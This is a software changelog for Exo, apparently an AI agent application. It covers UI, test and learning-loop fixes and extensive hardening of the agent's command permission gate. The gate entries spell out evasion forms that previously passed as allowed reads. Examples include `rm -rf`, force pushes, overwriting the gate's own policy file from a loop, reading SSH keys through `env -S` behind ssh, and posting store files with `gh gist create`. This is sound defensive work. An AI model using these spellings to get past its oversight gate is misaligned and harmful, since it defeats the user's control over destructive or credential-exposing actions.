# Changelog

All notable changes to Exo. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). Versions
follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJOR (0.x is egg).

## [Unreleased]

- Gate: invariant gh field parsing (#550, partial scope; remaining forms stay open).

- Added a gate PR preflight job that runs plugin acceptance and the base comparator, retaining its differential artifact (#423). Hosted execution and required-check configuration remain pending.

### Fixed
- Updated the frozen certifi bundle to 2026.10.23 for [GHSA-6q48-6c7w-9gw2](https://github.com/advisories/GHSA-6q48-6c7w-9gw2), removing the affected emSign root. Existing environments and packaged apps need a dependency refresh or rebuild to receive the updated bundle.
- Two causes of red hosted CI that were not the change under test (#907). `test_search_worker`'s check that a
  pathological search leaves the event loop running allowed only a 0.1 s gap; a busy macOS runner took 0.26 s to
  start the worker. It now allows half the 1 s timeout, which still fails when the search holds the loop. The
  web tests' headless Chrome no longer throttles background timers and frames, and the exo-command suite's summary
  names the Chrome binary and version it drove.
- Index bus recipient membership with a transactional derived table instead of scanning JSON recipients for each inbox query (#263).
- The Providers page, and every web route that relays a core error, now reads a refused bearer token as a refusal
  (#856, D-091 amendment). A web client started with `exo web --url URL --token-file FILE` and a stale token
  showed `SourceError: http_401: {"error": "bearer token required"}` with a "Try again" that could not help. It
  now names the token file and offers no retry. A core's own failure is shown in its own words, without
  `CommandFailed:` or `SourceError:` before it.
- The web guidance line after a failed model call now reads what the core records (#855, D-092 amendment).
  - A connection drop or timeout says the model could not be reached. Before, it pointed at `/trace`: the router
    reports a failure before any output as "all routes failed or are cooling down", and the `ReadError` or
    `ReadTimeout` behind it is only in the call's attempts.
  - A CLI login refusal (claude-cli "Not logged in", an expired OAuth token) points at the Providers page again,
    and so does a first run with no credentials.
  - `HTTP 404` and a proxy's `HTTP 407` are no longer read as a refused key.
  - A refusal still gets its line after two other failures, since each kind keeps its own count of two.
- The web thread list keeps a thread it just showed when an older list request answers late. Leaving Chat while
  the first message's new thread was being created, then coming back, could leave the sidebar empty ("No
  conversations yet.") until the next session event, because the page drew whichever list answer arrived last.
  It now draws an answer only when it was asked after the list on screen. This was the intermittent failure of
  `test_first_submission_recovery_belongs_to_created_thread_after_remount` (#859).
- The Providers page says why the model list failed instead of showing only a bare exception name, and
  offers "Try again" only when a retry can help. A core that answers and refuses the caller is no longer
  reported as unreachable, and a failed load keeps the last good list, so the default picker stays usable
  (D-091).

- `scripts/gate_diff.py` no longer reports "0 lowered" for three kinds of looser gate: one that fails open once a
  shared classify budget is spent (six long budget lines now run with the harvest, also under `--no-variants`), one
  whose `decide` returns an outcome the hook runs but does not know (`"Ask"`, `"block"`: ranked as allow in the head),
  and one that drops a hook check after `decide` at the same outcome (`no_grant`, `body_unseen`, `binds_exact`, a
  reserved hit on another part). The summary counts each (#551).
- A provider spend limit (HTTP 402) now says so instead of blaming the key, and a call whose route stopped on it
  carries the cost `+` mark, because that route's work is not billed in this turn. `trace` reports
  `undercounted_calls` apart from `unpriced_calls`, and marks the call in its table and JSON (D-093).
- Short chat windows scroll the chat column when status text expands, keeping the transcript and composer reachable.
- Fork-copy context lookups use a derived indexed original position instead of reparsing every message JSON on each call; existing rows backfill without changing signed message data (#450).
- The web workspace guidance line no longer tells the reader to check keys after a connection or timeout failure; credential advice is shown only when the recorded error reads as an authentication or permission failure, and an unreadable error points at `/trace` (#756).
- Foreground shell commands now mark nonzero exits, timeouts and interruptions as tool errors while retaining
  their output. Failed write-shaped commands no longer count as successful file progress in repeat detection.
  Successful pipelines with an earlier-stage failure note remain successful (#791).
- The bus `Store.verify` (relay `/v1/verify` and the `verify_ledger` MCP tool) answers ok false with checked 0
  for an inverted range, a range that starts past the head, or an explicit range on an empty log. It
  answered ok true for all three, so a check of nothing read as a clean log. `to` is clamped to the head.
  A verify with no range on an empty log still answers ok true, with `empty: true`. Port of
  aska-digital/exo-desktop #70 by sparky-118 (docs/PEERS.md "Bus seats").
- Learn review and the consolidation model reflector no longer drop a valid model reply because of a brace in
  the prose after it. The old greedy match ran to the last brace in the text. Port of aska-digital/exo-desktop
  #72 by sparky-118. The reflector tries each `{` and takes the first JSON object, so a bracketed note or an
  array before the object (`Note [draft]: {...}`) still reads as it did on main (#835 review). Learn's
  `parse_json` takes the first brace or bracket that decodes.
- `test_a_setup_state_is_not_a_harness_error` failed on a loaded machine: it slept a fixed 0.2 s after `TurnSend`,
  but the turn runs in a background task and files its `tool.error` finding only at the turn end, so a slow turn
  was cancelled before that and the finding was missing. The test now waits for the turn's task to end (30 s
  bound). Test-only.

### Added
- `exo findings backlog [--limit N] [--json]` counts unresolved findings (open, reopened, fixed awaiting
  re-verification) by severity and by age, and lists the oldest, at most 100. It reads one snapshot without the
  write lock, so the read neither waits for nor holds up a core that is filing a finding. Opening the store
  still takes the write lock briefly for its schema check (#797, refs #684). `docs/COMMANDS.md` lists it with
  the other `exo findings` commands.
- Web workspace design with coordinated dark and light themes, readable conversation typography,
  a full-width writing area, persistent accessible navigation and a saved Appearance choice.
  Loaded conversations can be searched and filtered; Show latest messages restores the newest item
  while streaming preserves the reader's position. Startup opens directly without a timed overlay.

- Automatic continuity checkpoints index recent tool and job records after interruption,
  compaction and restart. `/checkpoint` shows the bounded index; uncertain effects stay explicit,
  private and child sessions are excluded, and no tools are replayed (`docs/WORK-CHECKPOINT.md`, #683 slice).

- Web conversation drafts retain text and selection across thread and view switches in page memory.
  Pending sends block duplicate submission; unconfirmed sends keep recoverable text with their originating
  conversation and preserve newer edits. No automatic retry or browser persistence (D-045).


- Thread lists expose Rename with an explicit title editor, Save/Cancel and keyboard controls. Renaming another thread preserves the selected chat and composer draft ([Discussion #733](https://github.com/aska-digital/exo/discussions/733)).

### Added
- Optional session working notes with transcript evidence references, revision conflicts, restart
  recovery and bounded prompt/handoff snapshots. Undo marks affected notes stale. `/work` reads them
  through the normal gate and executor (`docs/WORK-NOTEBOOK.md`, D-086, #506).

### Changed
- A newer push to a pull request cancels that pull request's older `ci` and `gate preflight` runs, so a replaced
  run no longer holds hosted runners (#907, D-042 amendment). Each push to main keeps its own run.
- `CHANGELOG.md` now merges with git's union driver (`.gitattributes`, #842, D-089 amendment). Two branches that
  each add a bullet here no longer conflict. For a branch cut before this, run
  `echo 'CHANGELOG.md merge=union' >> "$(git rev-parse --git-common-dir)/info/attributes"` once per clone.
- Chat status instruments wrap within the conversation width. Model names, values and full-row notices
  remain readable when the window or conversation pane narrows, in both layouts.
- Chat notices stay with their session. Matching successful model calls clear retry and fallback warnings
  without clearing newer command errors or general notices.
- The core budget prices coupling, not only lines, and its ceiling is dropped (D-083, amending D-077).
  The line ceiling set on 2026-10-15 was already failing its own test: `main` at `13cea687` counted 15,828
  against 15,824, 4 over, while the work it blocked was ordinary product work, and each earlier raise
  (#314, #346, #598, the last by 11 to 1,011) was undone by the reduction it asked for. The principal ruled
  it "too restrictive" while the codebase is being built out, so `CORE_HEADROOM` is gone and
  `tests/integration/test_wave1_acceptance.py` reports the count against `CORE_FLOOR = 14,813` and asserts
  nothing about lines. What stays asserted is what D-077 said the real goal was, the engine split's step 4
  counts: at most 39 product imports into the core (`INWARD_IMPORTS_MAX`) and at most 8 cross-module
  private-state reads (`PRIVATE_STATE_MAX`). The floor and both counts keep their rule, they only ratchet
  down. Docs updated together: `docs/ENGINE-SPLIT.md` "Budget policy", `docs/DEVELOPER-GUIDE.md`,
  `docs/CORE.md`, `docs/OPTIMIZATION.md`, `docs/DOCS-MAP.md`, `docs/WHITEPAPER.md` sections 11 and 27.

### Fixed
- The gate reads `${...}` words and `$((` as bash's parser reads them (#143, #553, #554, PR #158). The lexer ended a
  `${...}` word at its first `}` and read nothing in it, so `echo ${X:-$(git push --force origin main)}` was an
  allowed `read` under every policy, and a `'}'` in a word hid the command after it
  (`echo ${x:-'}'} && rm -rf ./work`). Now each `$( )`, backquote, `$((` and unquoted `<( )` in a word is
  classified, a `'` pairs with the next one in the word (in double quotes too), and a part opened in quoted text
  ends at its quote. `$((` is arithmetic only when bash reads it so: `echo $((echo '((' ; git push --force origin
  main) )` is a `force_push` (#553). `${name@P}`, `${@@P}`, `${*@P}`, `${!name}`, `${!@}` and `${!*}`, which run a
  value, ask (#554); the listing forms `${!prefix*}` and `${!arr[@]}` do not. A here-document opened in a `$( )`
  stays with it, a backslash-newline after `$` is joined as #584 joins it, `$'` in double quotes is no ANSI-C
  string, and bash 5.3's `${ cmd; }` is read and asks, and so does a line that ends inside a quote (`'`, `"` or
  `$'`). A part only bash's reading opens (a `$( )`, `<( )`, `>( )`, backquote or arithmetic `$((` in a word, a
  `$((` bash runs as a subshell, quoted text bash expands, the text of `${ cmd; }`) is read three levels deep, its
  first `$(` or backquote level 1, and a call opens 24 such parts; a command deeper or past them asks. Where bash's
  reading may differ from the one before, the call is read both ways, the stricter decision holds, and an approval on
  such a line is bound to its exact text, even where both readings are the same act, as for any line with an `also`
  reading, so a standing grant on its category and target does not cover it. `scripts/gate_diff.py` finds no
  decision lower than before on its built-in corpus (with and without variants) and on an aimed corpus of these
  forms. Each of the two readings keeps its own #584 joined reading and D-074 `ordinary` reading, and
  `gate.readings` lists the `ordinary` reading of each. A command in a word keeps the readings it has alone: an ssh
  host target (#493), each store path a write names (#514), a write into a code-load folder (#459), a gh download
  into the store (#461), a glob in a secret store's folder (#594), a here-document's exact delimiter line (#328),
  `env -S`'s own argv (#591), a backslash-newline after `$` (#585), a `$((` bash runs as a `$( ( )` (#553), a
  store name in any letter case (#601), a `${..@P}` (#579) and legacy `$[ ]` (#588). The reading before is
  main's own lexer (on main f28934a3), #553's `$((` reading among them; a `${..@P}` is weighed as #579 weighs it (a
  literal the line assigns keeps the read), and a `$((` bash never closes asks where main reads it as text. Each of
  main's `env -S` readings (#591, #707: `Classification.split_readings`) is read both ways too, and so is the stdin
  of a `sudo -s` or `sudo -i` shell (#491, #718) with its reading as before #491, so a word in an `env -S` text or
  in that stdin is read: `env --split='echo ${v:-$(git push --force origin main)}'` and
  `sudo -i <<< 'echo ${v:-$(git push --force origin main)}'` deny under `categories: {force_push: deny}` (main
  f28934a3: ask), and a store write in such a word is answered by the principal only. `gate.readings` lists the
  `ordinary` and `split_readings` of every reading, and `binds_exact` binds a line with either in any reading.
  On main 34b5b495 (#546, #471) the quoted prefix reading composes with both: classify reads a quoted prefix
  assignment both ways (`Classification.before` is main's own reading, the quoted word the program), each with
  main's `env -S` readings, and each of those both ways for its words, the reading as before #143 named
  `Classification.flat`. So `X='a b' echo ${v:-$(rm -rf /srv/data)}` and the same word in an `env -S` text or a
  `sudo -s` shell's stdin behind a quoted prefix deny under `deny: [delete]` (main 34b5b495: ask), and
  `echo ${v:-$(X='a b' rm -rf /srv/data)}` denies under `categories: {delete: deny}` (main: allow); a store write
  in such a word is answered by the principal only. The exo-gate hook's bypass floor takes main's own reading
  first, `flat` where a word was read both ways, so a secret only bash's reading of a word finds is held beside
  a post that breaks the posting rules, as on main (the isolated head asked at the floor there). A word in an
  arithmetic `$((` behind or inside a quoted prefix is read the same way (`X='a b' echo $(( ${v:-$(rm -rf
  /srv/data)} ))`). Against main 34b5b495, `scripts/gate_diff.py` lowers 0 of 1,210,616 pairs on the built-in
  corpus without variants (20,428 tightened on 433 actions) and 0 of 603,680 pairs on an aimed corpus of 5,390
  quoted-prefix and parameter-word lines under 112 policies (29,281 tightened on 3,018 actions), and the hook in
  bypass decides none of 908 such lines lower (158 stricter). Tests:
  `tests/security/test_gate_parameter_expansion_quoted_prefix.py`, `plugins/exo-gate/tests/test_bypass.py`.
  On main a1dd4fec (#838, #479) each reading composes with the loop's second pass: bash's reading of the words and
  the reading as before #143 (`flat`, main's own) are each read by `_classify_read`, which reads a loop that `cd`s
  into the store a second time, so the command in a word in such a loop is read in the store on the next pass.
  `for i in 1 2; do echo ${v:-$(cp /tmp/evil gates.yaml)}; cd ~/.exo/policies; done`, which rewrites the policy
  file on the second pass, was an allowed read on main a1dd4fec and on this PR before the merge; it is now a
  `store_write`, the principal's alone, denied under `deny: [store_write]`, and the bypass floor holds (also in an
  `env -S` text, a sudo shell's stdin, a `$((`, a `{ ..; }` body and a loop inside a word). A `cd` in a word's
  `$( )` runs in a subshell and leaves the loop where it was. Against main a1dd4fec, `scripts/gate_diff.py` lowers
  0 of 1,227,248 pairs on the built-in corpus without variants (21,852 tightened on 441 actions) and 0 of 483,280
  pairs on an aimed corpus of 4,315 loop lines (a parameter word or `$((` behind or holding a quoted prefix, in a
  loop that `cd`s into the store) under 112 policies (38,849 tightened on 1,044 actions); a probe of those lines
  under 24 policies decides 0 pairs lower than main a1dd4fec or this PR before the merge (9,599 and 16,551
  stricter), with no reserved hit, violation, binding, `no_grant` or approver lost, and the hook in bypass decides
  none of 1,440 such lines lower (80 and 281 stricter). Known limit: a command bash's reading cuts in such a loop
  (more than three levels deep in a word, or past the call's 24 parts) is not read in the store on the next pass
  and stays an unread `opaque_exec` part, not a `store_write` part as past #838's budget: the line asks, but `deny:
  [store_write]` does not deny it and permissions bypass auto-allows it (main a1dd4fec allows it; docs/GATE.md).
  Tests: `tests/security/test_gate_parameter_expansion_loop_cd_store.py`, `plugins/exo-gate/tests/test_bypass.py`.
  `docs/GATE.md` "Shell parameter expansion (D-038)" lists the limits.

- A loop body that `cd`s into the store is read as running its earlier commands there on the next pass (#479, also
  #480). The gate read the body once, in order, so `for i in 1 2; do cp /tmp/evil gates.yaml; cd ~/.exo/policies;
  done` and its `while :` and `until false` forms, which rewrite the policy file on the second pass, were allowed
  reads on main f28934a3, also under `deny: [store_write]` (the `select` form and the `$( )` form asked but were not
  denied), and so was the brace-bodied `for i in 1 2; { cp /tmp/evil gates.yaml; cd ~/.exo/policies; }`. When a
  `for`, `select`, `while` or `until` body (a `coproc` one too) holds a `cd` or `pushd` into the store or a
  descriptor folder after the loop's first command, `classify` now reads the call a second time with that folder
  entered where the outermost such loop starts, and keeps that reading beside main's (`gate.readings`; the more
  severe leads): the rows are `store_write`, ask the principal alone, keep the bypass floor and deny under `deny:
  [store_write]`. A `for` or `select` loop with a `{ ..; }` body (`for i in 1 2; { ..; }`, `select x in a b; {
  ..; }`, `for ((..)) { ..; }`) counts as a `do ..; done` one; a `for ((..))` header is found from its own `((..))`,
  so a reserved word as its variable (`for ((do=0; do<2; do++)) { ..; }`), a `!` or any number of `|`, `&&` or
  `||` pieces in it do not hide the body. Nested loops, a loop condition, `cd -` or a `cd` out after the write,
  `pushd`, the store spelt as `"$HOME/.exo/policies"`, `$EXO_HOME/policies`, `${X:-..}` or a glob, and a loop in a
  `$( )` or `bash -c` count. A `for` word list, the loop's `done` or `}` redirections and a command before the loop
  run once and keep their folder. Known limits, as on main: a `cd` through a variable set earlier or the loop
  variable is not followed, and a loop behind `time` is not read again (it asks as `opaque_exec`, a seat may answer
  it and permissions bypass auto-allows it). The second reading may read afresh 64 lines more than the first; past
  that (a nest of loops in `$( )` five levels deep, which cost about 6 times main's time) it fails closed with one
  `store_write` part for the passes it did not read, so a deeper nest costs about 2 to 3 times main's CPU time (8
  levels: 1.05 s, main 0.39 s; 12 levels: 6.2 s, main 3.0 s), and about 4 times when the nest also writes
  `~/.exo/config.json`, whose D-074 reading is a classify of its own (6 levels: 1.10 s, main 0.29 s). Main's
  reading of every call is kept unchanged, so nothing decides lower: main's `scripts/gate_diff.py` against f28934a3
  lowers 0 of 1,123,144 built-in pairs (7,129 tightened on 122 actions), 0 of 4,409,664 pairs on an aimed corpus
  of 11,424 loop lines under 193 policies before the second verify (606,376 tightened on 7,792 actions), and 0 of
  2,737,512 pairs on the 7,092 lines with a `((` of that corpus and 4,950 new arithmetic-header lines (135,509
  tightened on 4,752 actions). Tests: `tests/security/test_gate_loop_cd_store_479.py`. **Docs:** `docs/GATE.md`
  "The store is credentials (D-038)", `DECISIONS.md` (D-038 amendment of 2026-10-28), `docs/DOCS-MAP.md`.
- A `while` or `until` loop whose condition starts with the `cd` into the store is read again too (#857, a #479
  follow-up). The condition runs on every pass, so in `while cd ~/.exo/policies$(cp /tmp/evil gates.yaml); do
  sleep 1; done` the `cp` rewrites the policy file from the second pass; it and five other spellings (`until !
  cd`, backticks, `pushd`, `< <(..)`, a `cd` in an `if`) were allowed reads on main 1401ff81, also under `deny:
  [store_write]`. They are now `store_write`, as the #479 rows are. A condition's `cd` into a descriptor folder
  names that folder when the loop holds no other store `cd` (`while cd /dev/fd < <(cp /tmp/evil 3); do :; done`
  denies under `deny: [target:/dev*]`). Main's `scripts/gate_diff.py`: 0 of 10,616,630 pairs
  lowered (built-in corpus, 11,044 aimed loop lines, `/dev*`, `/proc*` and `*store*` target rules kept apart).
  Tests: `tests/security/test_gate_loop_cd_store_479.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038
  amendment, #857), `docs/DOCS-MAP.md`.
- A compound command behind `time`, `time -p`, `time --` or `!` (and their combinations) is read as the same
  compound without them (#853). bash runs `time for i in 1 2; do cp /tmp/evil gates.yaml; cd ~/.exo/policies;
  done` as it runs the loop alone, but the gate read `time` as a program and the loop as its arguments, so on
  main a1dd4fec the line asked as `opaque_exec`, `deny: [store_write]` did not deny it, a seat could answer it
  and permissions bypass auto-allowed it, and `time { rm -rf /srv/data; }` was no delete. `classify` now also
  reads such a line with those prefix words left out, beside main's reading: the loop gets #479's second reading
  (a principal-only `store_write` that `deny: [store_write]` denies and bypass keeps at its floor), and a group's
  delete, force push or post (also in a `function f { ..; }` body behind `time !`, which main read behind `time`
  or `!` alone) is denied by a policy that denies it without the prefix. Main's reading stays, so
  `time { ls; }` still asks and nothing decides lower. Lines bash rejects (`nohup for ..`, `command for ..`, `env
  X=1 while ..`, `sudo -n while ..`, `time -p -p for ..`, `time` after `|`) run nothing and decide as on main.
  Main's `scripts/gate_diff.py` against a1dd4fec lowers 0 of 1,167,760 built-in pairs (79 tightened on 9
  actions) and 0 of 2,262,408 pairs on an aimed corpus of 10,572 prefixed compound lines under 214 policies
  (28,559 tightened on 2,054 actions). Tests: `tests/security/test_gate_pipeline_prefix_853.py`,
  `tests/security/test_gate_loop_cd_store_479.py`. **Docs:** `docs/GATE.md` "The store is credentials (D-038)",
  `DECISIONS.md` (D-038 amendment of 2026-10-29), `docs/DOCS-MAP.md`.

- Gate: on a store line, a rule written for another command no longer lifts a part's deny (#547). Under `matrix:
  {irreversible: {internal: deny, private: deny, public: deny}}` and `{match: {command: '^git push'}, decision:
  allow}`, `git push --force origin main && gh gist create ~/.exo/plugins/foo/__init__.py` asked the principal
  (`store_write ask floor`; `ask posting` with a `gh issue create -F` tail), while the same push beside
  `/tmp/plain.txt` is denied. The store send leads such a line, so the rule step does not run the own text test
  (#394), and #191's pass lifted the push part's matrix deny because the rule names the push's own text. That pass now
  also asks such a rule, on a store line, to pass the own text test of the whole line (`_line_own_test`), so the push
  stays denied with a `gh gist create`, `aws s3 cp` or `gh issue create -F` tail on a `plugins/` or `policies/` file,
  joined by `&&`, `;` or `||`, and with a `cp` write into the store after it. The change only passes more rules over
  in that pass, so nothing decides lower: against main f28934a3 the gate
  differential lowers no pair, on the built-in corpus (1,111,528 pairs, 73 tightened) and on an aimed corpus of these
  lines (1,892,784 pairs, 32,334 tightened, all `store_write ask -> store_write deny`). One rule that names
  every command on the line lifts the deny as before, and the store floor still asks. Separate rules that each name
  one command do not combine: under a `'^git push'` and a `'^gh gist create'` allow rule the push-first store line is
  `store_write deny matrix` (it asked at the floor before), as #394 decides the push beside a plain file. An `rm` or
  `curl -T` tail of a store file was already denied by its own cell. The whole line test runs once per rule on a line,
  not once per part, so a long store line stays linear in its parts; a rule that fails it is still passed over at each
  part a later rule lifts, so on 3,000 `git push` parts before a store send `decide` takes 0.06, 0.28 and 0.96 s of
  CPU with 0, 19 and 99 such rules ahead of one that names every command (main a1dd4fec: 0.05, 0.10, 0.12 s). Tests:
  `tests/security/test_gate_store_lift_own_text_547.py`.
- `exo config show`, `exo config get` and `config.get` mask a value shaped like a key that also holds a
  `${VAR}`, such as `${USER}:sk-...` in a file written by hand. `config set` refused it, but the masking skipped
  any string with a `${VAR}` in it. Both now use one test (#691, PR #674).

- The web session list answers 400 to a `limit` below 1 (exo-desktop #55). Only the top was cut, to 500, so
  `GET /api/chat/sessions?limit=-1` reached SQLite as `LIMIT -1`, which returns every session. A larger limit is
  still cut to 500. Tests: `plugins/exo-command/tests/test_chat.py`. **Docs:** `docs/ui/WEB.md` "What is where",
  D-039 amendment.

- The web Schedule page asks before it removes a job (exo-desktop #55). One click on remove deleted the job, and
  there is no undo. Remove now waits for a separate Confirm remove click on that card, drawn in the page, since a
  desktop web view with no confirm handler answers `window.confirm` with Cancel. Tests:
  `plugins/exo-command/tests/test_schedule_web.py`. **Docs:** `docs/ui/WEB.md`, `docs/USER-GUIDE.md` §5,
  `plugins/exo-command/README.md`, D-061 amendment.
- `exo.wire.verify` checks a signature only against a key the caller pins (exo-desktop #5, #17). Without one it
  used the public key carried in the signature itself, which whoever made the packet chose, so any packet
  signed by any key passed. With no pinned key it now returns False. No production caller used that path.
- Gate: an `env -S` text keeps the ssh hop's host and is split as env splits it (#591, follow-up to #634, review
  5665626829). #634 read the text's leading words as env's argv beside the text as a shell line, in the call's
  one reading. Behind an ssh hop its new part took the host (the hop's lead, or #320's copy on a secret or store
  line), so the `opaque_exec` part lost it: under `rules: [{match: {category: opaque_exec, target: host},
  decision: deny}]`, `ssh host 'env -S "'"'"'X=a b'"'"' cat ~/.ssh/id_rsa"'` went deny -> ask, below its plain
  `-S` spelling, and the `rm -rf` and `echo '...' | ssh host` forms did too; `reserved: [tool:terminal]` lost the
  `(opaque_exec, me@host)` hit of `ssh -p 22 me@host 'env -S ...'`. Now `classify` reads the call again with each
  text a shell line only, as before #634, and, whenever any `env -S` text or spelling is read, with #634's
  reading, as main read it, each as a call of its own
  (`Classification.split_readings`, listed by `gate.readings`), and `decide` keeps the strictest with every
  reserved hit and violation, so each part keeps the host it had. The call's first reading reads the line env
  runs (`_env_split_lines`): the text split by env's own rules (quotes, escapes, `\_`, `#`, `\c`, `${NAME}`; `;`,
  `&`, `|` and `>` are characters of a word, so `'X=a b';x` is one assignment), after `--` a `NAME=value` still
  an assignment (`env -- prog= true` runs `true`), in every spelling GNU env 9.4 takes: `--split` and each
  unambiguous `--split-string` prefix, `-S` in a word of short options (`-iS`, `-vS`, `-i0vS`), and `-S'..'`
  read whole (only `--split-string=` splits at its `=`). A spelling main missed reads as `-S TEXT` does, its
  `opaque_exec` part included and no environment dump read in it, in the first reading and in one more of the
  text as a shell line only, so `categories: {opaque_exec: deny}` denies `env --split-s="..."` and `env
  -i0vS"..."` as it denies `env -S "..."`, and the host rule does so behind ssh; the reading as before keeps
  what main read there. Each of `env --split`, `env -iS`, `env -vS`, `env -S'"X=a b" rm -rf /srv/data'`, `env
  -iS "rm -rf /srv/data"`, `env -S "-- 'X=a b' rm -rf /srv/data"` and `env -S "'X=a b';x rm -rf /srv/data"` now
  denies under `deny: [delete]` (main: ask); under `categories: {opaque_exec: allow}` the `--split`, `-iS`, `-vS`
  and `;x` rows now ask (main: allow; it asked on the `-S'..'` and `--` rows already). The exo-gate hook's
  bypass floor reads the category of each of these readings, so a line main kept as a credentials or store ask
  in bypass (`env -S "'X=a b' gh auth token \d"`, `env -- -S "'X=a b' muse login"`) still asks there. Main's
  reading is taken whenever any `env -S` text or spelling is read (verify 2): taken only where #634's words found
  a command in the first reading, it was dropped where a spelling main missed, read as `-S TEXT`, hid a nested
  text main read, and `env -iS'\q' sh -c 'env -S "'"'"'X=a b'"'"' rm -rf /srv/data"'` went deny -> ask under
  `deny: [delete]` (its `gh auth token` form: deny -> ask under `deny: [credentials]`, `no_grant` lost, and in
  bypass allowed where main asked at the floor); it decides as on main again. The bypass floor keeps main's order
  for main's own reading, which classify puts first in `split_readings` (verify 3): the floor when that reading is
  a floor category, then the hold of a post that breaks the posting rules, then the floor of any other reading.
  Checked before the hold for every reading, it turned 65 of 1,694 hook lines main held into an ask at the floor
  (`env -iS "gh auth token"; gh pr comment 5 --repo octo/demo --body "hello"`); they are held again, as on main. A
  call with an `env -S` text costs up to four readings, each linear in the text, and a spelling main missed is read
  in full: `env -S "'X=a b' rm -rf /srv/data"` takes 6 ms (main 58503282: 3 ms), `env --split="..."` with a 40 KB
  text of 20,000 words 3.7-4.4 s (main: 0.06 s). The #423 differential (main's script, `--jobs 2`) lowers 0 pairs
  against main 58503282 on the built-in corpus without variants (12,117 actions x 88 policies; 381 pairs tightened)
  and on an aimed corpus of 20,818 `env -S` lines without variants (28 spellings with 12 assignment prefixes before
  10 payloads, bare, behind sudo, doas, nice and timeout, 16 spellings behind ssh, mosh and stdin-fed ssh, and 20
  spellings before `sh -c` and `bash -c` with a nested `env -S` text, bare, behind those wrappers and hops) under
  180 policies (the built-in ones and rules, category lines, deny and reserved entries on the host and on ten
  categories; 98,066 pairs tightened). A hook probe of 3,626 lines through `pre_tool_call` (bypass on, and ask
  mode) lowers none.
  Tests:
  `tests/security/test_gate_env_split_string.py`, `tests/security/test_gate_category_deny_parts.py` (the `--`
  row now denies; the post row uses `posting.forbid_words` and asserts `forbidden word: Zork`),
  `plugins/exo-gate/tests/test_bypass.py`.
  **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038), `docs/DOCS-MAP.md`.

- The climb no longer takes a lesson whose evidence has decayed, and it catches a lesson that breaks another
  domain (exo-desktop #35 by orda-aska, ported with the follow-up from abu-aska's review there; issue 13 on the fork).
  A climb candidate needs a computed evidence weight of medium or high, not a stored `confidence`; a year after its
  one correction a preference was still a candidate on 721828fd. The held-out gate checked only the candidate's own
  domains, so a lesson that broke a work item while it won on mind was accepted. It now also gates each other
  domain's held-out items on their own; the own-domain check, with the pinned items, is unchanged, since pooling
  every domain into one composite let a work item that flipped up hide a mind item the candidate broke. An accepted
  candidate rescores every dev, held-out and pinned item, so `eval/incumbent.json` and the night's composite stop
  carrying the old incumbent's rows outside its domains; if the call budget runs out first, the merged rows are
  cached under a key the next night does not trust. A 120-item night with one accepted candidate made 256 responder
  calls, 173 before (+48%). Tests: `tests/eval/test_eval_climb.py`, `tests/learn/test_learn_nightly.py`.
  **Docs:** `docs/LEARNING.md` "The slow loop", `DECISIONS.md` (D-012).

- Git gc.recentObjectsHook is read as shell execution across git configuration forms, preserving policy denies on its nested command (#473).

- The core retries its start after a failed or cancelled start instead of failing every later command
  (exo-desktop #14, orda-aska). The provider readiness probe that runs when no main role is configured could
  raise once and leave every later command with the same `internal` error until exod restarted. A start cut
  short inside the MCP step no longer leaves its servers running: the retry stops them first, and engine close
  always closes MCP. Tests:
  `tests/integration/test_engine_start_retry.py`. **Docs:** `DECISIONS.md` D-010, `docs/CORE-V2-INTERFACES.md`
  "Protocol".

- Malformed peer presence records no longer break discovery or hide other live peers (#638).

- Encrypted group envelopes for another seat and unreadable encrypted bodies no longer create placeholder bus turns; the inbox cursor still advances (desktop audit #53).

- The pinned type baseline matches again after separating reused gate locals and typing terminal
  restart environments as read-only mappings; nine resolved diagnostics are removed (#710).

- Repeated corrections and rulings no longer reinforce rejected beliefs. New agreeing evidence creates a separate proposal for review while preserving the rejection (desktop audit #54).

- Consolidation matches a correction or ruling against active beliefs only, so a rejected belief that matches
  better no longer hides an active one (#861, after #770). A ruling that contradicts an accepted guarded belief
  raises the conflict question and is held, where since #770 it became an unheld proposal that rule 1 accepted
  beside the belief it contradicts; one that agrees with an open proposal reinforces it instead of opening a second
  one. A reviewer taste or fact lesson whose evidence is all held already by the rejected beliefs it agrees with,
  one or several together, is skipped again, as before #770: it is not proposed, raises no conflict question (even
  one the principal already answered) and reinforces no other belief. A reviewer skill lesson is not checked and is
  still proposed. New evidence after a rejection is still proposed. The rule of three still counts a
  rejected belief as known (docs/LEARNING.md "Signals in", DECISIONS.md D-012 amendment 2026-10-29).

- JSON beyond the decoder nesting limit in web approval, chat and provider POSTs returns the existing
  400 JSON input error instead of closing the connection without a response (follow-up to #751).

- Web approval requests with a JSON array, null or scalar return a 400 JSON error instead of closing
  the connection without a response. They send no approval answer to the core (#740).

- A gate error on a read tool asks instead of allowing the call, and the error card is once-only, so "always" cannot become a standing grant. A failed classification that read a store or secret goes to the principal alone (D-084).

- D-084 follow-up to #742 (port of aska-digital/exo-desktop #23 by orda-aska, ahrazzle and sparky-118). The
  unused `_SAFE_ON_ERROR` set is gone, and `scripts/gate_diff.py` models a gate error as an ask for every tool,
  reads included; it still modelled a read tool's error as allow. `docs/GATE.md`, `docs/EXECUTORS.md` and
  `docs/DEVELOPER-GUIDE.md` no longer say a read runs when the gate errs. D-084 gains Cost (an unattended run waits
  on the card), Limits and Validation. New tests cover bypass and observe mode: with `gate.classify` or the rules
  lookup raising, a bypass session asks once, as an ordinary one does, and in observe mode a store write or a
  secret goes to the principal while other calls run and the error is logged. Measured against `cd371aed`, before
  #742: a hook probe (224 cases) gave 136 stricter and 88 the same, none lower, and main's `gate_diff` found
  nothing lowered on 12,164 actions x 88 policies. Tests: `plugins/exo-gate/tests/test_hook.py`, `test_bypass.py`,
  `tests/integration/test_required_gate.py`, `tests/test_gate_diff.py`.

- Shared changes have one canonical Exo PR, with reviewed desktop syncs instead of duplicate feature implementations or direct automatic main updates (D-089).

- Restore the reviewed relative-import coupling counter and its regressions on main. `from .. import envscrub` counts like its absolute form. Existing exclusions, duplicate handling and caps are unchanged (refs #741).

- Internal steer messages receive an ID as soon as the running turn accepts them, so snapshots, cancellation and delivery keep the same identity (#722).

- `exo config get` and `exo config show` masked nothing on the command line, and the JSON API judged only the last
  segment of a dotted key. Both now mask a secret at any level of the key path (a secret-shaped name, a container
  under one, and a literal under `env` or `headers`), and `config set` refuses the same shapes. `${VAR}` references
  and `*_env` names are still shown and accepted (#691).
